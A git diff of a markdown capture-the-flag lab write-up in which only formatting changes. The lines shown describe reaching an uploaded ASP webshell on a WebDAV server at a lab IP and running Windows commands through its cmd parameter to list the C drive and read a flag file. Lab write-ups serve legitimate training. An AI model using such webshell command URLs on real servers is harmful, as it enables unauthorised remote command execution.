@@ -173,7 +173,7 @@ Progress: [=============================>] 100.0% of 1362 bytes succeeded.
 
 ![](.gitbook/assets/image-20230310140533335.png)
 
-- Access the backdoor using the browser - http://10.3.26.115/webdav/webshell.asp
+- Access the backdoor using the browser - `http://10.3.26.115/webdav/webshell.asp`
 - Windows commands can be provided in the box
 
 ![](.gitbook/assets/image-20230310140749091.png)
@@ -182,8 +182,8 @@ Progress: [=============================>] 100.0% of 1362 bytes succeeded.
 
 ![](.gitbook/assets/image-20230310140924518.png)
 
-- `dir C:\` command - http://10.3.26.115/webdav/webshell.asp?cmd=dir+C%3A%5C
-- `type C:\flag.txt` command - http://10.3.26.115/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
+- `dir C:\` command - `http://10.3.26.115/webdav/webshell.asp?cmd=dir+C%3A%5C`
+- `type C:\flag.txt` command - `http://10.3.26.115/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt`
 
 <details>
 <summary>Reveal Flag: 🚩</summary>
